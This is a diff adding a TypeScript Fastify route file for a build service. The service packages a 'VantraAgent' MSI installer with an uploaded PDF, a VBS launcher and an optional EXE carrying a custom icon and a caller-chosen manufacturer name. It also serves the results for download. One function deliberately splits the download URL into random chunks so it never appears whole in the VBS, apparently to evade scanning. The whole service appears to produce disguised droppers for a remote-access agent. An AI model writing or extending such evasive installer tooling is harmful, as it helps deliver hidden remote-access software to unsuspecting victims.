@@ -1,0 +1,364 @@
+/**
+ * HTTP route handlers for POST /build and GET /downloads/:jobId
+ */
+
+import { FastifyInstance, FastifyRequest, FastifyReply } from "fastify";
+import * as crypto from "crypto";
+import * as fs from "fs";
+import * as path from "path";
+import { env } from "./env";
+import * as storage from "./storage";
+import * as builder from "./builder";
+import * as exeBuilder from "./exe-builder";
+
+const UUID_V4_REGEX =
+  /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;
+
+const PDF_MAGIC_BYTES = Buffer.from([0x25, 0x50, 0x44, 0x46]); // %PDF
+
+const ICO_MAGIC_BYTES = Buffer.from([0x00, 0x00, 0x01, 0x00]);
+const MAX_ICO_SIZE = 500 * 1024; // 500 KB
+
+const VBS_TEMPLATE_PATH = path.join(
+  __dirname,
+  "..",
+  "..",
+  "msi-builder",
+  "src",
+  "installer.vbs.template"
+);
+
+/**
+ * Constant-time comparison to prevent timing attacks.
+ */
+function timingSafeCompare(
+  provided: string,
+  expected: string
+): boolean {
+  const providerBuf = Buffer.alloc(expected.length);
+  const expectedBuf = Buffer.from(expected);
+  providerBuf.write(provided);
+  try {
+    return crypto.timingSafeEqual(providerBuf, expectedBuf);
+  } catch {
+    return false;
+  }
+}
+
+/**
+ * Split a URL into a VBScript string-concatenation expression so the raw
+ * download URL never appears as a single contiguous string in the VBS file.
+ * Produces 3 to 5 chunks joined with " & ".
+ */
+function obfuscateVbsUrl(url: string): string {
+  const numParts = 3 + Math.floor(Math.random() * 3); // 3 to 5 parts
+  const len = url.length;
+  const cuts: number[] = [];
+
+  while (cuts.length < numParts - 1) {
+    const cut = 1 + Math.floor(Math.random() * (len - 2));
+    if (!cuts.includes(cut)) cuts.push(cut);
+  }
+  cuts.sort((a, b) => a - b);
+
+  const parts: string[] = [];
+  let prev = 0;
+  for (const c of cuts) {
+    parts.push(url.slice(prev, c));
+    prev = c;
+  }
+  parts.push(url.slice(prev));
+
+  return parts.map(p => `"${p}"`).join(' & ');
+}
+
+/**
+ * POST /build - Receive build request, validate inputs, run build, return download URL.
+ */
+async function postBuild(request: FastifyRequest, reply: FastifyReply) {
+  // Authenticate via Authorization header
+  const authHeader = request.headers.authorization;
+  if (!authHeader || !authHeader.startsWith("Bearer ")) {
+    return reply.status(401).send({ error: "Unauthorized" });
+  }
+
+  const token = authHeader.slice(7); // Remove "Bearer "
+  if (!timingSafeCompare(token, env.GENERATOR_SECRET)) {
+    return reply.status(401).send({ error: "Unauthorized" });
+  }
+
+  // Parse multipart fields — use parts() only; never mix with file()/files()
+  const fields: Record<string, string> = {};
+  let pdfBuffer: Buffer | null = null;
+  let icoBuffer: Buffer | null = null;
+
+  try {
+  for await (const part of request.parts()) {
+    if (part.type === "field") {
+      fields[part.fieldname] = part.value as string;
+    } else if (part.type === "file" && part.fieldname === "pdf") {
+      // Read the entire file into memory
+      const chunks: Buffer[] = [];
+      for await (const chunk of part.file) {
+        chunks.push(chunk);
+      }
+      pdfBuffer = Buffer.concat(chunks);
+    } else if (part.type === "file" && part.fieldname === "ico") {
+      const chunks: Buffer[] = [];
+      for await (const chunk of part.file) {
+        chunks.push(chunk);
+      }
+      icoBuffer = Buffer.concat(chunks);
+    }
+  }
+  } catch {
+    return reply.status(400).send({ error: "Request must be multipart/form-data" });
+  }
+
+  // Validate required fields
+  const clientId = fields.clientId ? parseInt(fields.clientId, 10) : NaN;
+  const siteId = fields.siteId ? parseInt(fields.siteId, 10) : NaN;
+
+  if (isNaN(clientId) || clientId <= 0) {
+    return reply
+      .status(400)
+      .send({ error: "clientId must be a positive integer" });
+  }
+  if (isNaN(siteId) || siteId <= 0) {
+    return reply
+      .status(400)
+      .send({ error: "siteId must be a positive integer" });
+  }
+
+  const agentType = fields.agentType;
+  if (agentType !== "workstation" && agentType !== "server") {
+    return reply
+      .status(400)
+      .send({ error: 'agentType must be "workstation" or "server"' });
+  }
+
+  const authToken = fields.authToken;
+  if (!authToken || authToken.trim() === "") {
+    return reply.status(400).send({ error: "authToken is required" });
+  }
+
+  const apiUrl = fields.apiUrl;
+  if (!apiUrl || !apiUrl.startsWith("https://")) {
+    return reply
+      .status(400)
+      .send({ error: "apiUrl must start with https://" });
+  }
+
+  const manufacturer = fields.manufacturer;
+  if (!manufacturer || manufacturer.trim() === "") {
+    return reply.status(400).send({ error: "manufacturer is required" });
+  }
+
+  // Validate PDF
+  if (!pdfBuffer) {
+    return reply.status(400).send({ error: "pdf file is required" });
+  }
+
+  const MAX_PDF_SIZE = 20 * 1024 * 1024; // 20 MB
+  if (pdfBuffer.length > MAX_PDF_SIZE) {
+    return reply.status(413).send({ error: "PDF must be under 20 MB" });
+  }
+
+  // Check PDF magic bytes
+  if (pdfBuffer.length < 4 || !pdfBuffer.subarray(0, 4).equals(PDF_MAGIC_BYTES)) {
+    return reply.status(400).send({ error: "File must be a valid PDF" });
+  }
+
+  // Validate ICO file (optional premium feature)
+  if (icoBuffer !== null) {
+    if (icoBuffer.length > MAX_ICO_SIZE) {
+      return reply.status(413).send({ error: "ICO file must be under 500 KB" });
+    }
+    if (
+      icoBuffer.length < 4 ||
+      !icoBuffer.subarray(0, 4).equals(ICO_MAGIC_BYTES)
+    ) {
+      return reply.status(400).send({ error: "ico field must be a valid .ico file" });
+    }
+  }
+
+  // All validation passed — proceed with job creation and build
+  try {
+    // Create job and save PDF
+    const jobId = storage.createJob();
+    storage.savePdf(jobId, pdfBuffer);
+
+    if (icoBuffer) {
+      fs.writeFileSync(storage.icoPath(jobId), icoBuffer);
+    }
+
+    const pdfPath = storage.msiOutputPath(jobId).replace(/output\.msi$/, "guide.pdf");
+    const outputPath = storage.msiOutputPath(jobId);
+
+    // Run the build
+    const buildResult = await builder.runBuild({
+      clientId,
+      siteId,
+      agentType,
+      authToken,
+      apiUrl,
+      manufacturer,
+      pdfPath,
+      outputPath,
+      builderPath: env.MSI_BUILDER_PATH,
+    });
+
+    if (!buildResult.success) {
+      // Build failed — clean up and return error
+      storage.cleanupJob(jobId);
+      console.error(`Build failed for job ${jobId}: ${buildResult.output}`);
+      return reply
+        .status(502)
+        .send({ error: "MSI build failed. Check server logs." });
+    }
+
+    // Schedule cleanup
+    const ttlMs = env.JOB_TTL_HOURS * 3600 * 1000;
+    setTimeout(() => storage.cleanupJob(jobId), ttlMs);
+
+    // Return success response
+    const expiresAt = new Date(Date.now() + ttlMs).toISOString();
+    const downloadUrl = `${env.PUBLIC_URL}/downloads/${jobId}`;
+
+    // Generate VBS launcher (premium feature)
+    const vbsTemplate = fs.readFileSync(VBS_TEMPLATE_PATH, "utf8");
+    const vbsContent = vbsTemplate
+      .replace(/\{\{DOWNLOAD_URL_EXPR\}\}/g, obfuscateVbsUrl(downloadUrl))
+      .replace(/\{\{MANUFACTURER\}\}/g, manufacturer);
+    fs.writeFileSync(storage.vbsOutputPath(jobId), vbsContent, "utf8");
+
+    // Build branded EXE launcher (premium feature — only if ICO was provided)
+    let exeUrl: string | undefined;
+    if (icoBuffer) {
+      const exeResult = await exeBuilder.runExeBuild({
+        vbsPath: storage.vbsOutputPath(jobId),
+        icoPath: storage.icoPath(jobId),
+        outputPath: storage.exeOutputPath(jobId),
+        builderPath: env.MSI_BUILDER_PATH,
+        manufacturer,
+      });
+      if (exeResult.success) {
+        exeUrl = `${env.PUBLIC_URL}/downloads/${jobId}/installer.exe`;
+      } else {
+        console.error(`EXE build failed for job ${jobId}: ${exeResult.output}`);
+        // Non-fatal: MSI and VBS are still available
+      }
+    }
+
+    return reply.status(200).send({
+      downloadUrl,
+      vbsUrl: `${env.PUBLIC_URL}/downloads/${jobId}/installer.vbs`,
+      ...(exeUrl ? { exeUrl } : {}),
+      expiresAt,
+    });
+  } catch (err) {
+    const message = err instanceof Error ? err.message : String(err);
+    console.error(`Build error: ${message}`);
+    return reply
+      .status(500)
+      .send({ error: "Internal server error" });
+  }
+}
+
+/**
+ * GET /downloads/:jobId - Stream the MSI file and clean up after.
+ */
+async function getDownload(request: FastifyRequest, reply: FastifyReply) {
+  const { jobId } = request.params as { jobId: string };
+
+  // Validate job ID format
+  if (!UUID_V4_REGEX.test(jobId)) {
+    return reply.status(400).send({ error: "Invalid job ID" });
+  }
+
+  // Get MSI path
+  const msiPath = storage.msiOutputPath(jobId);
+
+  // Check file exists
+  if (!fs.existsSync(msiPath)) {
+    return reply.status(404).send({ error: "Not found" });
+  }
+
+  // Set response headers
+  reply.header("Content-Type", "application/octet-stream");
+  reply.header("Content-Disposition", 'attachment; filename="VantraAgent.msi"');
+
+  // Stream the file
+  const stream = fs.createReadStream(msiPath);
+
+  // Clean up after stream finishes
+  stream.on("close", () => {
+    storage.cleanupJob(jobId);
+  });
+
+  stream.on("error", () => {
+    storage.cleanupJob(jobId);
+  });
+
+  return reply.send(stream);
+}
+
+/**
+ * GET /downloads/:jobId/installer.vbs - Return the generated VBS launcher.
+ */
+async function getVbsDownload(request: FastifyRequest, reply: FastifyReply) {
+  const { jobId } = request.params as { jobId: string };
+
+  if (!UUID_V4_REGEX.test(jobId)) {
+    return reply.status(400).send({ error: "Invalid job ID" });
+  }
+
+  const vbsPath = storage.vbsOutputPath(jobId);
+
+  if (!fs.existsSync(vbsPath)) {
+    return reply.status(404).send({ error: "Not found or expired" });
+  }
+
+  reply.header("Content-Type", "application/octet-stream");
+  reply.header(
+    "Content-Disposition",
+    'attachment; filename="VantraAgentInstaller.vbs"'
+  );
+
+  return reply.send(fs.readFileSync(vbsPath));
+}
+
+/**
+ * GET /downloads/:jobId/installer.exe - Return the branded EXE launcher.
+ */
+async function getExeDownload(request: FastifyRequest, reply: FastifyReply) {
+  const { jobId } = request.params as { jobId: string };
+
+  if (!UUID_V4_REGEX.test(jobId)) {
+    return reply.status(400).send({ error: "Invalid job ID" });
+  }
+
+  const exePath = storage.exeOutputPath(jobId);
+
+  if (!fs.existsSync(exePath)) {
+    return reply.status(404).send({ error: "Not found or expired" });
+  }
+
+  reply.header("Content-Type", "application/octet-stream");
+  reply.header(
+    "Content-Disposition",
+    'attachment; filename="VantraAgentInstaller.exe"'
+  );
+
+  return reply.send(fs.readFileSync(exePath));
+}
+
+/**
+ * Register routes with the Fastify instance.
+ */
+export async function registerRoutes(app: FastifyInstance) {
+  app.post("/build", postBuild);
+  app.get("/downloads/:jobId", getDownload);
+  app.get("/downloads/:jobId/installer.vbs", getVbsDownload);
+  app.get("/downloads/:jobId/installer.exe", getExeDownload);
+}
